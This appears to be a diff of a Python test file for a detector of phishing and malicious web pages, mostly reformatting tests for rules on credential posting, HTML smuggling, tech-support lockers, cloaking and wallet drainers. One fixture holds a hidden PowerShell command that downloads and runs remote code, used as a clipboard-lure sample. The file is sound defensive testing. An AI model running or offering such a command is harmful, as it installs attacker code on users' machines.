-    assert "script_posted_credentials" not in _hits(_cap("https://kit.example/login", [page], requests=same))  # noqa: E501
+    assert "script_posted_credentials" in _hits(
+        _cap("https://kit.example/login", [page], har=har, requests=reqs)
+    )  # noqa: E501
+    same = [
+        {
+            "method": "POST",
+            "type": "fetch",
+            "url": "https://kit.example/api",
+            "frame_url": "https://kit.example/login",
+        }
+    ]  # noqa: E501
+    assert "script_posted_credentials" not in _hits(
+        _cap("https://kit.example/login", [page], requests=same)
+    )  # noqa: E501
 
 
 @pytest.mark.parametrize("rtype", ["fetch", "", "other"])
@@ -1571,8 +1733,14 @@ def test_login_page_third_party_analytics_post_is_quiet(rtype):
     consent POSTs to a third party is not posting credentials."""
     url = "https://app.example/login"
     page = _page(url, title="Log in", forms=[LOOSE_PW])
-    reqs = [{"method": "POST", "type": rtype, "url": "https://analytics.vendor.net/collect",
-             "frame_url": url}]  # noqa: E501
+    reqs = [
+        {
+            "method": "POST",
+            "type": rtype,
+            "url": "https://analytics.vendor.net/collect",
+            "frame_url": url,
+        }
+    ]  # noqa: E501
     har = [_req("https://analytics.vendor.net/collect", "POST", post="v=2&tid=G-1&en=page_view")]
     assert "script_posted_credentials" not in _hits(_cap(url, [page], har=har, requests=reqs))
 
@@ -1595,8 +1763,14 @@ def test_base64_analytics_body_is_not_credentials():
 
     url = "https://app.example/login"
     page = _page(url, title="Log in", forms=[LOOSE_PW])
-    reqs = [{"method": "POST", "type": "fetch", "url": "https://analytics.vendor.net/c",
-             "frame_url": url}]  # noqa: E501
+    reqs = [
+        {
+            "method": "POST",
+            "type": "fetch",
+            "url": "https://analytics.vendor.net/c",
+            "frame_url": url,
+        }
+    ]  # noqa: E501
     enc = base64.b64encode(b'{"event":"page_view","screen":"login"}').decode()
     har = [_req("https://analytics.vendor.net/c", "POST", post="e=" + enc)]
     assert "script_posted_credentials" not in _hits(_cap(url, [page], har=har, requests=reqs))
@@ -1606,15 +1780,24 @@ def test_script_posted_credentials_with_brand_prompt_fires_on_opaque_body():
     """Kits encrypt the body (Tycoon), so a brand credential prompt stands in for it."""
     url = "https://m365-clone.example/"
     page = _page(url, title="Sign in to your account", text="Microsoft", forms=[LOOSE_PW])
-    reqs = [{"method": "POST", "type": "xhr", "url": "https://drop.example/r.php",
-             "frame_url": url}]  # noqa: E501
+    reqs = [
+        {"method": "POST", "type": "xhr", "url": "https://drop.example/r.php", "frame_url": url}
+    ]  # noqa: E501
     har = [_req("https://drop.example/r.php", "POST", post="data=U2FsdGVkX1+" + "Q" * 40)]
     assert "script_posted_credentials" in _hits(_cap(url, [page], har=har, requests=reqs))
 
 
 def test_runtime_dynamic_execution_fires_and_small_evals_are_quiet():
-    jsapi = {"exec": {"count": 3, "max_len": 4000, "max_entropy": 5.2,
-                      "code_count": 3, "code_max_len": 4000, "code_max_entropy": 5.2}}  # noqa: E501
+    jsapi = {
+        "exec": {
+            "count": 3,
+            "max_len": 4000,
+            "max_entropy": 5.2,
+            "code_count": 3,
+            "code_max_len": 4000,
+            "code_max_entropy": 5.2,
+        }
+    }  # noqa: E501
     assert "runtime_dynamic_execution" in _hits(_cap("https://x.example/", jsapi=jsapi))
     small = {"exec": {"count": 1, "max_len": 50, "max_entropy": 2.0}}
     assert "runtime_dynamic_execution" not in _hits(_cap("https://x.example/", jsapi=small))
@@ -1628,10 +1811,12 @@ def test_runner_keeps_code_exec_apart_from_markup_sinks(tmp_path):
 
     (tmp_path / "scripts").mkdir()
     stub = SimpleNamespace(jsapi={}, dynamic_scripts=0, out=tmp_path)
-    Capture._on_jsapi(stub, "js_exec", {"api": "innerHTML", "len": 9000, "entropy": 4.9,
-                                        "code": "<div>" * 1800})  # noqa: E501
-    Capture._on_jsapi(stub, "js_exec", {"api": "eval", "len": 300, "entropy": 4.1,
-                                        "code": "x" * 300})  # noqa: E501
+    Capture._on_jsapi(
+        stub, "js_exec", {"api": "innerHTML", "len": 9000, "entropy": 4.9, "code": "<div>" * 1800}
+    )  # noqa: E501
+    Capture._on_jsapi(
+        stub, "js_exec", {"api": "eval", "len": 300, "entropy": 4.1, "code": "x" * 300}
+    )  # noqa: E501
     ex = stub.jsapi["exec"]
     assert (ex["count"], ex["max_len"]) == (2, 9000)
     assert (ex["code_count"], ex["code_max_len"]) == (1, 300)
@@ -1645,8 +1830,11 @@ def test_runtime_dynamic_execution_ignores_innerhtml_markup():
 
 def test_html_smuggling_binary_blob_fires_and_csv_export_is_quiet():
     jsapi = {"blobs": [{"ctor": "Blob", "size": 50000, "mime": "application/octet-stream"}]}
-    data = _cap("https://x.example/", jsapi=jsapi,
-                downloads=[{"sha256": "aa", "suggested_filename": "invoice.exe"}])  # noqa: E501
+    data = _cap(
+        "https://x.example/",
+        jsapi=jsapi,
+        downloads=[{"sha256": "aa", "suggested_filename": "invoice.exe"}],
+    )  # noqa: E501
     data.download_heads = {"aa": b"MZ\x90\x00"}
     assert "html_smuggling_binary_blob" in _hits(data)
     # A reporting tool exporting a CSV via a blob, no risky download.
@@ -1664,8 +1852,9 @@ def test_risky_archive_contents_and_clean_archive(tmp_path):
         zf.writestr("report.pdf", b"%PDF-1.7")
 
     def cap(path):
-        d = _cap("https://x.example/",
-                 downloads=[{"sha256": "aa", "suggested_filename": path.name}])
+        d = _cap(
+            "https://x.example/", downloads=[{"sha256": "aa", "suggested_filename": path.name}]
+        )
         d.download_heads = {"aa": path.read_bytes()[:32780]}
         d.download_paths = {"aa": str(path)}
         return d
@@ -1682,37 +1871,61 @@ def test_password_protected_archive_with_printed_password(tmp_path):
         zf.setpassword(b"infected")
         zf.writestr("setup.exe", b"MZ")
     page = _page("https://dl.example/", text="Download the file. Password: infected")
-    d = _cap("https://dl.example/", [page],
-             downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}])  # noqa: E501
+    d = _cap(
+        "https://dl.example/", [page], downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}]
+    )  # noqa: E501
     d.download_heads = {"aa": enc.read_bytes()[:32780]}
     d.download_paths = {"aa": str(enc)}
     assert "password_protected_archive_with_password" in _hits(d)
     # No printed password on the page: quiet.
     plain = _page("https://dl.example/", text="Download the file")
-    d2 = _cap("https://dl.example/", [plain], downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}])  # noqa: E501
+    d2 = _cap(
+        "https://dl.example/", [plain], downloads=[{"sha256": "aa", "suggested_filename": "e.zip"}]
+    )  # noqa: E501
     d2.download_heads = {"aa": enc.read_bytes()[:32780]}
     d2.download_paths = {"aa": str(enc)}
     assert "password_protected_archive_with_password" not in _hits(d2)
 
 
 def test_tech_support_locker_fires_and_video_fullscreen_is_quiet():
-    page = _page("https://alert.example/", title="Windows Defender Alert",
-                 text="Your computer is infected with a trojan. Call support now 1-800-555-0199.")  # noqa: E501
-    assert "tech_support_browser_locker" in _hits(_cap("https://alert.example/", [page], jsapi={"apis": {"requestFullscreen": 1}}))  # noqa: E501
+    page = _page(
+        "https://alert.example/",
+        title="Windows Defender Alert",
+        text="Your computer is infected with a trojan. Call support now 1-800-555-0199.",
+    )  # noqa: E501
+    assert "tech_support_browser_locker" in _hits(
+        _cap("https://alert.example/", [page], jsapi={"apis": {"requestFullscreen": 1}})
+    )  # noqa: E501
     vid = _page("https://video.example/", title="Watch", text="Play in fullscreen")
-    assert "tech_support_browser_locker" not in _hits(_cap("https://video.example/", [vid], jsapi={"apis": {"requestFullscreen": 1}}))  # noqa: E501
+    assert "tech_support_browser_locker" not in _hits(
+        _cap("https://video.example/", [vid], jsapi={"apis": {"requestFullscreen": 1}})
+    )  # noqa: E501
 
 
 def test_history_flooding_fires_above_threshold():
-    assert "history_flooding" in _hits(_cap("https://x.example/", jsapi={"apis": {"history.pushState": 40}}))  # noqa: E501
-    assert "history_flooding" not in _hits(_cap("https://x.example/", jsapi={"apis": {"history.pushState": 3}}))  # noqa: E501
+    assert "history_flooding" in _hits(
+        _cap("https://x.example/", jsapi={"apis": {"history.pushState": 40}})
+    )  # noqa: E501
+    assert "history_flooding" not in _hits(
+        _cap("https://x.example/", jsapi={"apis": {"history.pushState": 3}})
+    )  # noqa: E501
 
 
 def test_push_notification_bait_fires_and_news_prompt_is_quiet():
-    bait = _page("https://verify.example/", title="Verify", text="Click Allow to continue and prove you are human")  # noqa: E501
-    assert "push_notification_bait" in _hits(_cap("https://verify.example/", [bait], jsapi={"apis": {"Notification.requestPermission": 1}}))  # noqa: E501
+    bait = _page(
+        "https://verify.example/",
+        title="Verify",
+        text="Click Allow to continue and prove you are human",
+    )  # noqa: E501
+    assert "push_notification_bait" in _hits(
+        _cap(
+            "https://verify.example/", [bait], jsapi={"apis": {"Notification.requestPermission": 1}}
+        )
+    )  # noqa: E501
     news = _page("https://news.example/", title="News", text="Subscribe for the latest headlines")
-    assert "push_notification_bait" not in _hits(_cap("https://news.example/", [news], jsapi={"apis": {"Notification.requestPermission": 1}}))  # noqa: E501
+    assert "push_notification_bait" not in _hits(
+        _cap("https://news.example/", [news], jsapi={"apis": {"Notification.requestPermission": 1}})
+    )  # noqa: E501
 
 
 def test_cloaking_scripted_bounce_fires_and_canonical_redirect_is_quiet():
@@ -1720,27 +1933,37 @@ def test_cloaking_scripted_bounce_fires_and_canonical_redirect_is_quiet():
     data = _cap("https://www.google.com/404", redirects=bounce)
     data.domain_ages = {"kit.io": 5}
     assert "cloaking_scripted_bounce" in _hits(data)
-    canon = [{"from": "http://shop.example/", "to": "https://www.shop.example/",
-              "type": "http_301"}]
+    canon = [
+        {"from": "http://shop.example/", "to": "https://www.shop.example/", "type": "http_301"}
+    ]
     ok = _cap("https://www.shop.example/", redirects=canon)
     ok.domain_ages = {"shop.example": 5}
     assert "cloaking_scripted_bounce" not in _hits(ok)
 
 
 def test_trusted_redirector_to_lure_fires_and_plain_ad_click_is_quiet():
-    chain = [{"from": "https://www.google.com/url?q=x", "to": "https://lure.example/",
-              "type": "js"}]
-    clip = [{"page": "p0", "api": "x", "text": "powershell -w hidden -c \"irm x|iex\""}]
-    assert "trusted_redirector_to_lure" in _hits(_cap("https://lure.example/", redirects=chain, clipboard=clip))  # noqa: E501
+    chain = [
+        {"from": "https://www.google.com/url?q=x", "to": "https://lure.example/", "type": "js"}
+    ]
+    clip = [{"page": "p0", "api": "x", "text": 'powershell -w hidden -c "irm x|iex"'}]
+    assert "trusted_redirector_to_lure" in _hits(
+        _cap("https://lure.example/", redirects=chain, clipboard=clip)
+    )  # noqa: E501
     assert "trusted_redirector_to_lure" not in _hits(_cap("https://shop.example/", redirects=chain))
 
 
 def test_captcha_gated_credential_page_fires_and_allowlisted_is_quiet():
     har = [_req("https://challenges.cloudflare.com/turnstile/v0/api.js")]
-    page = _page("https://login-portal.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])  # noqa: E501
-    assert "captcha_gated_credential_page" in _hits(_cap("https://login-portal.example/", [page], har=har))  # noqa: E501
+    page = _page(
+        "https://login-portal.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM]
+    )  # noqa: E501
+    assert "captcha_gated_credential_page" in _hits(
+        _cap("https://login-portal.example/", [page], har=har)
+    )  # noqa: E501
     ok = _page("https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
-    assert "captcha_gated_credential_page" not in _hits(_cap("https://login.live.com/", [ok], har=har, allowlisted=["live.com"]))  # noqa: E501
+    assert "captcha_gated_credential_page" not in _hits(
+        _cap("https://login.live.com/", [ok], har=har, allowlisted=["live.com"])
+    )  # noqa: E501
 
 
 def test_idp_cdn_uses_request_initiator_when_available():
@@ -1748,18 +1971,43 @@ def test_idp_cdn_uses_request_initiator_when_available():
     cdn_url = "https://aadcdn.msftauth.net/shared/logo.png"
     page = _page("https://clone.example/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
     har = [_req(cdn_url)]
-    reqs = [{"method": "GET", "type": "image", "url": cdn_url, "document_url": "https://clone.example/"}]  # noqa: E501
-    assert "idp_cdn_assets_foreign_page" in _hits(_cap("https://clone.example/", [page], har=har, requests=reqs))  # noqa: E501
+    reqs = [
+        {"method": "GET", "type": "image", "url": cdn_url, "document_url": "https://clone.example/"}
+    ]  # noqa: E501
+    assert "idp_cdn_assets_foreign_page" in _hits(
+        _cap("https://clone.example/", [page], har=har, requests=reqs)
+    )  # noqa: E501
     # The asset was loaded by a Microsoft-owned document in the session: no clone.
-    reqs_ms = [{"method": "GET", "type": "image", "url": cdn_url, "document_url": "https://login.live.com/"}]  # noqa: E501
+    reqs_ms = [
+        {
+            "method": "GET",
+            "type": "image",
+            "url": cdn_url,
+            "document_url": "https://login.live.com/",
+        }
+    ]  # noqa: E501
     ms = _page("https://login.live.com/", title="Sign in", text="Microsoft", forms=[PASSWORD_FORM])
-    assert "idp_cdn_assets_foreign_page" not in _hits(_cap("https://clone.example/", [page, ms], har=har, requests=reqs_ms))  # noqa: E501
+    assert "idp_cdn_assets_foreign_page" not in _hits(
+        _cap("https://clone.example/", [page, ms], har=har, requests=reqs_ms)
+    )  # noqa: E501
 
 
 def test_library_inventory_parses_cdn_versions():
-    page = {"frames": [{"url": "https://kit.example/", "title": "", "text": "", "forms": [],
-            "iframes": [], "scripts": [{"src": "https://cdn/crypto-js@4.1.1/crypto-js.min.js"},
-            {"src": "https://cdn/ajax/libs/jquery/3.6.0/jquery.min.js"}]}]}  # noqa: E501
+    page = {
+        "frames": [
+            {
+                "url": "https://kit.example/",
+                "title": "",
+                "text": "",
+                "forms": [],
+                "iframes": [],
+                "scripts": [
+                    {"src": "https://cdn/crypto-js@4.1.1/crypto-js.min.js"},
+                    {"src": "https://cdn/ajax/libs/jquery/3.6.0/jquery.min.js"},
+                ],
+            }
+        ]
+    }  # noqa: E501
     libs = build_facts(_cap("https://kit.example/", [page]))["scripts"]["libraries"]
     names = {lib["name"]: lib["version"] for lib in libs}
     assert names.get("crypto-js") == "4.1.1"
@@ -1899,7 +2147,9 @@ def test_search_label_and_allowlisted_help_page_are_quiet():
     data = _cap(
         url,
         [
-            _proto_page(url, "Search: invoices", links=["search:", "https://shop.example-host.com/s"]),
+            _proto_page(
+                url, "Search: invoices", links=["search:", "https://shop.example-host.com/s"]
+            ),
             _proto_page("https://help.bigblog.com/", "Invoice help", links=[_SEARCH_MS]),
         ],
         allowlisted={"bigblog.com"},
@@ -1988,7 +2238,9 @@ def test_explorer_api_read_on_plain_site_fires_and_dapp_is_quiet():
 
 def _drainer(url, text, age):
     page = _page(url, "Claim", text=text)
-    page["frames"][0]["scripts"] = [{"src": "https://cdn.example-cdn.com/walletconnect@2.9.0/index.js"}]
+    page["frames"][0]["scripts"] = [
+        {"src": "https://cdn.example-cdn.com/walletconnect@2.9.0/index.js"}
+    ]
     data = _cap(url, [page])
     data.domain_ages = {"example-host.com": age}
     return data
